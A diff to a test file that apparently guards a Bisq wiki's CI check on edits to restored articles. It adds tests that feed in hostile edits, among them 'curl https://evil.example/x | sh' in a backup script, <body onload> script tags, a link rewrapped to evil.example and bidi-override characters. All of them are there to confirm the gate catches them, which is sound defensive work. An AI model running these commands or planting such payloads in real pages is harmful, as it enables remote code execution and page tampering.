@@ -96,7 +96,11 @@ test("npm run build is the strict gate plus exactly the steps the check job runs
   const check = readFileSync(".github/workflows/check.yml", "utf8");
   assert.match(check, /\n {8}run: node scripts\/check-source-fidelity\.mjs --awaiting-receipt-base "\$RUNNER_TEMP\/base"\n {6}- run: npm run build:after-fidelity\n/);
   // The receipts job renders articles too, so it installs the same packages first.
-  assert.match(check, /\n {6}- run: npm ci\n {6}- name: Articles awaiting an accepted-edit receipt\n {8}run: node scripts\/check-awaiting-receipts\.mjs /);
+  assert.match(check, /\n {6}- run: npm ci --ignore-scripts\n {6}- name: Articles awaiting an accepted-edit receipt\n {8}run: node scripts\/check-awaiting-receipts\.mjs /);
+  // The receipts job installs without running install scripts. The only package with one
+  // is fsevents, an optional macOS file watcher the gate does not use.
+  const withScripts = Object.entries(JSON.parse(readFileSync("package-lock.json", "utf8")).packages).filter(([, entry]) => entry.hasInstallScript).map(([name]) => name);
+  assert.deepEqual(withScripts, ["node_modules/fsevents"]);
   // Only the flag relaxes the gate: no environment variable can.
   for (const file of ["scripts/check-source-fidelity.mjs", "scripts/lib/markdown-format.mjs", "scripts/lib/rendered-html.mjs", "scripts/lib/accepted-edits.mjs"]) {
     assert.doesNotMatch(readFileSync(file, "utf8"), /process\.env/, file);
@@ -352,7 +356,9 @@ test("the receipts job drafts a receipt for each reviewer who may approve, with 
 
 test("the recovery safeguards still apply to an accepted edit", async () => {
   const weakened = restore.replace("btc_mainnet/tor/hiddenservice", "btc_mainnet/tor");
-  onlyFinding(await run({ [restorePath]: weakened }, [restoreReceipt(restore, weakened)]), /last-resort-restore\.md: lost recovery safeguard: btc_mainnet\/tor\/hiddenservice/);
+  // The safeguard sits in a code block, which changes only when the receipt lists it.
+  onlyFinding(await run({ [restorePath]: weakened }, [restoreReceipt(restore, weakened)]), /PR #46 changes source-code-7 \(a code block, table or recovery gap marker\); these change only when the receipt lists them in changed_locked_content/);
+  onlyFinding(await run({ [restorePath]: weakened }, [{ ...restoreReceipt(restore, weakened), changed_locked_content: ["source-code-7"] }]), /last-resort-restore\.md: lost recovery safeguard: btc_mainnet\/tor\/hiddenservice/);
 });
 
 test("describeEdit records readable whole-word changes that undo and apply exactly", () => {
@@ -399,17 +405,17 @@ test("an accepted edit cannot add, hide or run content through markup", async ()
     [inject("[^1]\n\n[^1]: A footnote."), /changes the page outside the article body|adds or removes <(?:sup|section|a href="#user-content)/],
     [after(":::note\nInjected aside\n:::"), /adds or removes <aside/],
     // Expressive Code wraps a fenced code block in a figure, with a script and a stylesheet.
-    [after("```\ncode\n```"), /adds or removes (?:images or figures|<)/],
-    [after("| a | b |\n| - | - |\n| 1 | 2 |"), /adds or removes <(?:table|thead|tbody|tr|th|td)>/],
+    [after("```\ncode\n```"), /adds or removes (?:images or figures|a code block|<)/],
+    [after("| a | b |\n| - | - |\n| 1 | 2 |"), /adds or removes a code block, table or recovery gap marker/],
     [after("> Quoted"), /adds or removes <blockquote>/],
     [after("***"), /adds or removes <hr>/],
     [after("- [ ] task"), /adds or removes <(?:ul class|li class|input)/],
     [after("3. Third"), /adds or removes <ol start="3">/],
     [after("<div>Injected block</div>"), /adds or removes <div>/],
     // HTML that would reach past the article on the page.
-    [original.replace("Specify your explorer\\'s address on the Bisq settings screen.", 'Specify <a href="https://example.org">your explorer\\\'s address on the Bisq settings screen.'), /leaves an element open, closes one it did not open, or carries formatting past the article/],
-    [after("</div>\n\nOutside the article."), /changes the page outside the article body|leaves an element open/],
-    [after("<div>\n\nUnclosed."), /leaves an element open/],
+    [original.replace("Specify your explorer\\'s address on the Bisq settings screen.", 'Specify <a href="https://example.org">your explorer\\\'s address on the Bisq settings screen.'), /changes the page around the article: it leaves an element open, closes one it did not open, or carries formatting past its end/],
+    [after("</div>\n\nOutside the article."), /changes the page outside the article body|changes the page around the article/],
+    [after("<div>\n\nUnclosed."), /changes the page around the article: it leaves an element open/],
   ]) {
     assert.notEqual(edited, original);
     onlyFinding(await run({ [path]: edited }, [receipt(original, edited)]), pattern);
@@ -510,6 +516,93 @@ test("an accepted HTML edit can be converted: the HTML is rebuilt and every link
   onlyFinding(await run({ [path]: hiddenMarkdown }, [receipt(htmlOriginal, hidden)], 2, {}, sneaky), /PR #46 adds or removes <span hidden>/);
 });
 
+// Review findings (PR #188), each a confirmed attack.
+
+const committedArticle = (slug) => readFileSync(`src/content/docs/wiki/${slug}.md`, "utf8");
+const receiptFor = (slug, base, edited, fields = {}) => receipt(base, edited, { slug, note_ids: [], ...fields });
+/** The committed conversion record with slug's Markdown hash set to markdown: a re-recorded conversion. */
+const rerecorded = (slug, markdown) => markdownFormatText([...committedFormat.map((item) => (item.slug === slug ? { ...item, markdown_file_sha256: hash(markdown) } : item)), ...markdown_samples()]);
+function markdown_samples() { return [conversionOf(path), conversionOf(restorePath)]; }
+
+test("tags that act on the page's own elements fail, with a receipt, awaiting one, or as a re-recorded conversion", async () => {
+  const teams = committedArticle("teams");
+  for (const [find, replacement] of [
+    ["Bisq is a [FOSS]", 'Bisq is a <body onload="alert(1)">[FOSS]'],
+    ["There is no CEO.", 'There is no CEO.<body onpageshow="document.title=\'pwned\'">'],
+    ["\n## Control {#control}", '\n<html hidden style="display:none">\n\n## Control {#control}'],
+    ["\n## Control {#control}", "\n<body inert>\n\n## Control {#control}"],
+    ["\n## Control {#control}", "\n</body></html>\n\n## Control {#control}"],
+    ["There is no CEO.", 'There is no CEO.<body dir="rtl" style="unicode-bidi:bidi-override">'],
+    ["There is no CEO.", "There is no CEO.</main>"],
+    ["There is no CEO.", "There is no CEO.<frameset></frameset>"],
+  ]) {
+    const edited = teams.replace(find, replacement);
+    assert.notEqual(edited, teams, replacement);
+    const pattern = /teams\.md: .*changes the page around the article: it has a <\/?(?:body|html|main|frameset)> tag/;
+    onlyFinding(await run({ "src/content/docs/wiki/teams.md": edited }, [receiptFor("teams", teams, edited)]), pattern);
+    onlyFinding(await run({ "src/content/docs/wiki/teams.md": edited }, [], 2, { readBase: baseFrom(new Map([["src/content/docs/wiki/teams.md", teams]])) }), pattern);
+    onlyFinding(await run({ "src/content/docs/wiki/teams.md": edited, [markdownFormatPath]: rerecorded("teams", edited) }, []), /teams\.md: its Markdown conversion .* changes the page around the article: it has a/);
+  }
+});
+
+test("the page is checked as readers get it, after the page's string replacements", async () => {
+  // A line break instead of the space before a gap marker's <small>: invisible as HTML,
+  // but the page's link repair no longer matches, so the page links other text.
+  const troubleshooting = committedArticle("troubleshooting");
+  const edited = troubleshooting.replace("Delete and resync SPV file <small>", "Delete and resync SPV file\n<small>");
+  assert.notEqual(edited, troubleshooting);
+  const html = readFileSync(preservedArticlePath("troubleshooting"), "utf8");
+  assert.match(await formatDifference({ slug: "troubleshooting", html, markdown: edited }), /the Markdown renders differently from the HTML it replaced/);
+  onlyFinding(await run({ "src/content/docs/wiki/troubleshooting.md": edited, [markdownFormatPath]: rerecorded("troubleshooting", edited) }, []), /troubleshooting\.md: its Markdown conversion .* does not render as the HTML it replaced/);
+  onlyFinding(await run({ "src/content/docs/wiki/troubleshooting.md": edited }, [receiptFor("troubleshooting", troubleshooting, edited)]), /troubleshooting\.md: PR #46 (?:adds or removes|changes gap-)/);
+});
+
+test("a figure, its link and its caption stay as restored", async () => {
+  const wrapped = original.replace(/(<figure class="wiki-source-image" id="source-image-1"><a href="[^"]+">)(<img [^>]+>)(<\/a>)/, '$1$3<a href="https://evil.example/">$2</a>');
+  const captioned = original.replace("<figcaption>XMR auto confirm<br>", "<figcaption>Official XMR settings<br>");
+  for (const edited of [wrapped, captioned]) {
+    assert.notEqual(edited, original);
+    onlyFinding(await run({ [path]: edited }, [receipt(original, edited)]), /PR #46 changes the figure source-image-1 or the link that opens it/);
+  }
+});
+
+test("code blocks, tables and gap markers change only when the receipt lists them", async () => {
+  // A shell command in a code block.
+  const scriptPath = "src/content/docs/wiki/automatic-backup-script.md";
+  const script = committedArticle("automatic-backup-script");
+  const code = script.replace("chmod +x bisq1backup\nnano", "chmod 777 bisq1backup && curl https://evil.example/x | sh\nnano");
+  assert.notEqual(code, script);
+  onlyFinding(await run({ [scriptPath]: code }, [receiptFor("automatic-backup-script", script, code)]), /PR #46 changes source-code-3 \(a code block, table or recovery gap marker\); these change only when the receipt lists them in changed_locked_content/);
+  assert.deepEqual((await run({ [scriptPath]: code }, [receiptFor("automatic-backup-script", script, code, { changed_locked_content: ["source-code-3"] })])).failures, []);
+  const awaiting = await run({ [scriptPath]: code }, [], 2, { readBase: baseFrom(new Map([[scriptPath, script]])) });
+  assert.deepEqual([awaiting.failures, awaiting.awaiting.map(awaitingLine)], [[], ["automatic-backup-script: source-code-3 (code block, table or recovery gap marker) changed; its receipt must list it in changed_locked_content"]]);
+  onlyFinding(await run({ [path]: reworded }, [receipt(original, reworded, { changed_locked_content: ["table-1"] })]), /PR #46 lists table-1 in changed_locked_content, but it is unchanged/);
+  // A table cell and a gap marker in other articles.
+  for (const [slug, find, replacement, key] of [
+    ["bitcoin-units", "<td>100,000,000,000,000</td>", "<td>200,000,000,000,000</td>", "table-"],
+    ["critical-bugs", "[section not recovered: Delivered]", "[section recovered]", "gap-"],
+    ["critical-bugs", ' <small class="wiki-link-gap">[section not recovered: Delivered]</small>', "", "gap-"],
+  ]) {
+    const article = committedArticle(slug);
+    const edited = article.replace(find, replacement);
+    assert.notEqual(edited, article);
+    const result = await run({ [`src/content/docs/wiki/${slug}.md`]: edited }, [receiptFor(slug, article, edited)]);
+    assert.equal(result.failures.length, 1, result.failures.join("\n"));
+    assert.match(result.failures[0], new RegExp(`${slug}\\.md: PR #46 (?:changes ${key}\\d+|adds or removes a code block, table or recovery gap marker)`));
+  }
+});
+
+test("invisible characters are added only when the receipt lists them", async () => {
+  for (const [character, label] of [["\u200b", "U+200B"], ["\u202e", "U+202E"], ["\u2066", "U+2066"], ["\u00ad", "U+00AD"]]) {
+    const edited = original.replace("one of the most active markets", `one of the most${character} active markets`);
+    onlyFinding(await run({ [path]: edited }, [receipt(original, edited)]), new RegExp(`PR #46 adds invisible characters \\(${label.replace("+", "\\+")}\\)`));
+    assert.deepEqual((await run({ [path]: edited }, [receipt(original, edited, { added_invisible_characters: [label] })])).failures, []);
+    assert.equal(awaitingLine((await run({ [path]: edited }, [], 2, withBase)).awaiting[0]), `trading-monero: invisible characters ${label} added; its receipt must list it in added_invisible_characters`);
+  }
+  onlyFinding(await run({ [path]: reworded }, [receipt(original, reworded, { added_invisible_characters: ["U+200B"] })]), /PR #46 lists U\+200B in added_invisible_characters, but adds no such character/);
+  assert.match((await run({ [path]: reworded }, [receipt(original, reworded, { added_invisible_characters: ["200B"] })])).failures.join("\n"), /added_invisible_characters must list code points such as U\+200B/);
+});
+
 // HTML articles: not yet converted, they are checked as before, and on their rendered page too.
 
 test("HTML article: an edit with a receipt passes, without one it fails or awaits", async () => {
@@ -535,7 +628,7 @@ test("HTML article: structure, markup and blank lines are checked as before", as
     [htmlOriginal.replace("(default: 1 BTC)", "(default: 1 BTC)<!-- hidden -->"), /adds or removes an HTML comment/],
     [htmlOriginal.replace("(default: 1 BTC)", "(default: 1 BTC)\n\n## Injected heading\n\n"), /adds or removes a blank line/],
     // An unclosed link before the article's end would carry into the page after it.
-    [htmlOriginal.replace("Specify your explorer's address", 'Specify <a href="https://example.org">your explorer\'s address'), /leaves an element open, closes one it did not open, or carries formatting past the article/],
+    [htmlOriginal.replace("Specify your explorer's address", 'Specify <a href="https://example.org">your explorer\'s address'), /changes the page around the article: it leaves an element open, closes one it did not open, or carries formatting past its end/],
   ]) {
     assert.notEqual(edited, htmlOriginal);
     onlyFinding(await runHtml({ [path]: edited }, [receipt(htmlOriginal, edited)]), pattern);
@@ -544,5 +637,5 @@ test("HTML article: structure, markup and blank lines are checked as before", as
   assert.deepEqual((await runHtml({ [path]: plain }, [receipt(htmlOriginal, plain)])).failures, []);
   const htmlRestore = restoredFiles.get(restorePath);
   const weakened = htmlRestore.replace("btc_mainnet/tor/hiddenservice", "btc_mainnet/tor");
-  onlyFinding(await runHtml({ [restorePath]: weakened }, [restoreReceipt(htmlRestore, weakened)]), /last-resort-restore\.md: lost recovery safeguard: btc_mainnet\/tor\/hiddenservice/);
+  onlyFinding(await runHtml({ [restorePath]: weakened }, [{ ...restoreReceipt(htmlRestore, weakened), changed_locked_content: ["source-code-7"] }]), /last-resort-restore\.md: lost recovery safeguard: btc_mainnet\/tor\/hiddenservice/);
 });
